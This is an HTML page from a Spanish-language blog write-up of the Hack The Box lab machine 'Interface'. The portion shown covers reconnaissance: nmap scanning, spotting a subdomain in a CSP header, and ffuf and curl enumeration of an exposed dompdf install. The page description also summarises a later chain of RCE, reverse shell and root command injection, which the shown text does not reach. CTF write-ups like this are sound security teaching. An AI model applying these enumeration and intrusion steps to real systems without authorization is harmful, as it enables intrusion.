@@ -1,0 +1,378 @@
+<!doctype html><html lang="es"><head><title>Interface | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web hecho en Next.js que expone un subdominio en la cabecera Content-Security-Policy. Ahií, podemos enumerar dependencias de terceros como dompdf. Esta es vulnerable a ejecución remota de comandos. Después de mucha enumeración para interactuar con dompdf, encontramos una manera de obtener una reverse shell en el sistema. Luego, el usuario root ejecuta un script cada minuto, y el script es vulnerable a inyección de comandos, que debe explotarse agregando metadatos maliciosos a un archivo temporal. Al encadenar estos pasos, podemos obtener una reverse shell como root"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web hecho en Next.js que expone un subdominio en la cabecera Content-Security-Policy. Ahií, podemos enumerar dependencias de terceros como dompdf. Esta es vulnerable a ejecución remota de comandos. Después de mucha enumeración para interactuar con dompdf, encontramos una manera de obtener una reverse shell en el sistema. Luego, el usuario root ejecuta un script cada minuto, y el script es vulnerable a inyección de comandos, que debe explotarse agregando metadatos maliciosos a un archivo temporal. Al encadenar estos pasos, podemos obtener una reverse shell como root"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web hecho en Next.js que expone un subdominio en la cabecera Content-Security-Policy. Ahií, podemos enumerar dependencias de terceros como dompdf. Esta es vulnerable a ejecución remota de comandos. Después de mucha enumeración para interactuar con dompdf, encontramos una manera de obtener una reverse shell en el sistema. Luego, el usuario root ejecuta un script cada minuto, y el script es vulnerable a inyección de comandos, que debe explotarse agregando metadatos maliciosos a un archivo temporal. Al encadenar estos pasos, podemos obtener una reverse shell como root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web hecho en Next.js que expone un subdominio en la cabecera Content-Security-Policy. Ahií, podemos enumerar dependencias de terceros como dompdf. Esta es vulnerable a ejecución remota de comandos. Después de mucha enumeración para interactuar con dompdf, encontramos una manera de obtener una reverse shell en el sistema. Luego, el usuario root ejecuta un script cada minuto, y el script es vulnerable a inyección de comandos, que debe explotarse agregando metadatos maliciosos a un archivo temporal. Al encadenar estos pasos, podemos obtener una reverse shell como root"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web hecho en Next.js que expone un subdominio en la cabecera Content-Security-Policy. Ahií, podemos enumerar dependencias de terceros como dompdf. Esta es vulnerable a ejecución remota de comandos. Después de mucha enumeración para interactuar con dompdf, encontramos una manera de obtener una reverse shell en el sistema. Luego, el usuario root ejecuta un script cada minuto, y el script es vulnerable a inyección de comandos, que debe explotarse agregando metadatos maliciosos a un archivo temporal. Al encadenar estos pasos, podemos obtener una reverse shell como root"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Interface/Interface.webp"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Interface/Interface.webp"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Interface/Interface.webp"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Interface"><meta property="twitter:title" content="Interface"><meta property="og:title" content="Interface"><meta property="og:url" content="https://7rocky.github.io/htb/interface/"><meta itemprop="keywords" content="php,cronjob,metadata,command-injection,static-code-analysis,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/interface/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/interface/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/interface/&amp;text=Interface" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/interface/&amp;title=Interface" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Interface</h1><time class="mt4 f6 dib tracked" datetime="2023-05-13T00:00:00+01:00">13 / 05 / 2023</time><br><p class="mb4 f6 dib tracked">12 minutos de lectura</p></header><div class="htb-image"><img alt="Interface" src="/images/HTB/Interface/Interface.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/metadata" title="Metadatos de archivos">Metadatos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/command-injection" title="Inyección de Comandos">Inyección de Comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-del-subdominio">Enumeración del subdominio</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#encontrando-una-api">Encontrando una API</a></li><li><a href="#explotación-de-dompdf">Explotación de <code>dompdf</code></a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.200</li><li><strong>Fecha</strong>: 11 / 02 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted -p 22,80 10.10.11.200
+Nmap scan report for 10.10.11.200
+Host is up (0.057s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
+|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
+|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Site Maintenance
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 10.95 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.200</code>, veremos una página como esta:</p><p><img src="/images/HTB/Interface/Interface-1.webp" alt="Interface 1"></p><p>Parece una página estática. No hay nada que ver aquí. Cada recurso a los que intentamos acceder da como resultado un error <code>404 Not Found</code>:</p><p><img src="/images/HTB/Interface/Interface-2.webp" alt="Interface 2"></p><p>Si inspeccionamos el código fuente, podemos ver que el sitio web está construido con Next.js (versión 13.0.4):</p><p><img src="/images/HTB/Interface/Interface-3.webp" alt="Interface 3"></p><p>Hay versiones de Next.js que tienen algunas vulnerabilidades, pero la versión 13.0.4 parece ser segura. Por lo tanto, la explotación no involucra a Next.js.</p><p>Este <em>framework</em> utiliza JavaScript para representar la página web, por lo que al inspeccionar los archivos de JavaScript podemos identificar el texto de la página y una dirección de correo electrónico (<code>contact@interface.htb</code>):</p><p><img src="/images/HTB/Interface/Interface-4.webp" alt="Interface 4"></p><p>Aún así, si quisiéramos enumerar las rutas disponibles, estarían en la lista <code>sortedPages</code> del archivo <code>_next/static/&lt;id>/_buildManifest.js</code>:</p><p><img src="/images/HTB/Interface/Interface-5.webp" alt="Interface 5"></p><p>La figura anterior muestra que no hay rutas. Por lo tanto, esta página web es un callejón sin salida.</p><p>Pero vemos que hay un error en la consola JavaScript:</p><p><img src="/images/HTB/Interface/Interface-6.webp" alt="Interface 6"></p><p>Habla sobre la cabecera <code>Content-Security-Policy</code> (CSP). Vamos a ver:</p><p><img src="/images/HTB/Interface/Interface-7.webp" alt="Interface 7"></p><p>Tenemos este CSP:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;  
+</code></pre></div><p>Aquí podemos encontrar un subdominio: <code>http://prd.m.rendering-api.interface.htb</code>. Vamos a agregar entonces <code>interface.htb</code> y <code>prd.m.rendering-api.interface.htb</code> al archivo <code>/etc/hosts</code> para continuar enumerando.</p><h3 id="enumeración-del-subdominio">Enumeración del subdominio</h3><p>Tenemos esto:</p><p><img src="/images/HTB/Interface/Interface-8.webp" alt="Interface 8"></p><p>Vamos a emplear <code>ffuf</code> para enumerar más rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/FUZZ  
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 50ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 44ms]</span>
+    * FUZZ: vendor
+</code></pre></div><p>Ahora tenemos <code>/vendor</code>. De nuevo, no podemos acceder:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/vendor -i
+HTTP/1.1 403 Forbidden
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 13:33:10 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+Access denied.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/vendor/ -i  
+HTTP/1.1 404 Not Found
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 13:33:15 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+File not found.
+</code></pre></div><p>Entonces, continuamos enumerando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ  
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 48ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 44ms]</span>
+    * FUZZ: dompdf
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 45ms]</span>
+    * FUZZ: composer
+</code></pre></div><p>De nuevo, no podemos acceder a ninguno:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/vendor/dompdf -i
+HTTP/1.1 403 Forbidden
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 13:41:22 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+Access denied.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/vendor/dompdf/ -i
+HTTP/1.1 404 Not Found
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 13:41:24 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+File not found.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/vendor/composer -i
+HTTP/1.1 403 Forbidden
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 13:41:29 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+Access denied.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> prd.m.rendering-api.interface.htb/vendor/composer/ -i  
+HTTP/1.1 404 Not Found
+<span class="code-white">Server</span>: nginx/1.14.0 (Ubuntu)
+<span class="code-white">Date</span>: Sun, 12 Feb 2023 13:41:31 GMT
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+<span class="code-white">Transfer-Encoding</span>: chunked
+<span class="code-white">Connection</span>: keep-alive
+
+File not found.
+</code></pre></div><p>El que parece más interesante es <code>dompdf</code>, porque <code>composer</code> es solo un administrador de dependencias para aplicaciones PHP. Entonces&mldr; continuemos con la enumeración:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/FUZZ
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 41ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 40ms]</span>
+    * FUZZ: dompdf
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/FUZZ  
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 51ms]</span>
+    * FUZZ: lib
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 42ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 41ms]</span>
+    * FUZZ: tests
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 43ms]</span>
+    * FUZZ: src
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 42ms]</span>
+    * FUZZ: VERSION
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 45ms]</span>
+    * FUZZ: .git
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 45ms]</span>
+    * FUZZ: .gitignore
+</code></pre></div><p>Con la lista de directorios anteriores, podemos suponer que el servidor tiene <a href="https://github.com/dompdf/dompdf"><code>dompdf</code></a> instalado, que es una aplicación PHP para convertir código HTML en documentos PDF.</p><p>De hecho, podemos confirmar que es <a href="https://github.com/dompdf/dompdf"><code>dompdf</code></a> enumerando archivos con extensiones y ver que también aparecen en el repositorio de GitHub:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/FUZZ -e .php,.md,.json  
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 42ms]</span>
+    * FUZZ: lib
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 46ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 39ms]</span>
+    * FUZZ: tests
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 41ms]</span>
+    * FUZZ: src
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 49ms]</span>
+    * FUZZ: README.md
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 77ms]</span>
+    * FUZZ: VERSION
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 44ms]</span>
+    * FUZZ: .git
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 46ms]</span>
+    * FUZZ: .gitignore
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 41ms]</span>
+    * FUZZ: composer.json
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/FUZZ -e .php
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 47ms]</span>
+    * FUZZ: .
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 40ms]</span>
+    * FUZZ: Css
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 41ms]</span>
+    * FUZZ: Image
+
+<span class="code-dark-green">[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 44ms]</span>
+    * FUZZ: Options.php
+
+<span class="code-dark-green">[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]</span>
+    * FUZZ: Helpers.php
+
+<span class="code-dark-yellow">[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 43ms]</span>
+    * FUZZ: Frame
+
+<span class="code-dark-green">[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]</span>
+    * FUZZ: Frame.php
